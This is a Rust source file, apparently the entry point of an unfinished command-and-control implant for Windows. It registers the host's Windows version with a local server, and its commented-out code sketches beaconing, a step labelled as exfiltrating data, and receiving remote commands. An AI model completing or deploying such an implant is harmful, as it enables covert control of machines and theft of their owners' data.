mod server;
mod system;
use std::{sync::Arc};
use system::get_windows_version;
use tokio::time::{Duration, sleep};


macro_rules! unwrap_or_panic {
    ($expr: expr) => {
        match $expr{
            Ok(res) =>{
                res
            },
                Err(e) => {panic!("Couldn't connect to server {}", e)
            }
        }   
    };
}

#[tokio::main]
async fn main() {
    const URL: &'static str  = "http://127.0.0.1:5000";

    
    let server = Arc::new(server::Connection::new(&URL));

    let arch = get_windows_version();

    let id: String = unwrap_or_panic!(server.register(arch).await);

    // let server_clone = Arc::clone(&server);
    // let id_clone = id.clone();

    // tokio::spawn(async move {
    //     loop {
    //         server_clone.becon(&id_clone).await;
    //         sleep(Duration::from_secs(1000)); 
    //     }
    // });

    loop{
        //exfiltrates data
        // server.send_data(&id, "HHHH").await;
        // sleep(Duration::from_secs(5));
        // returns the command
        // let rec = unwrap_or_panic!(server.get_command(&id).await);        
    }    
}
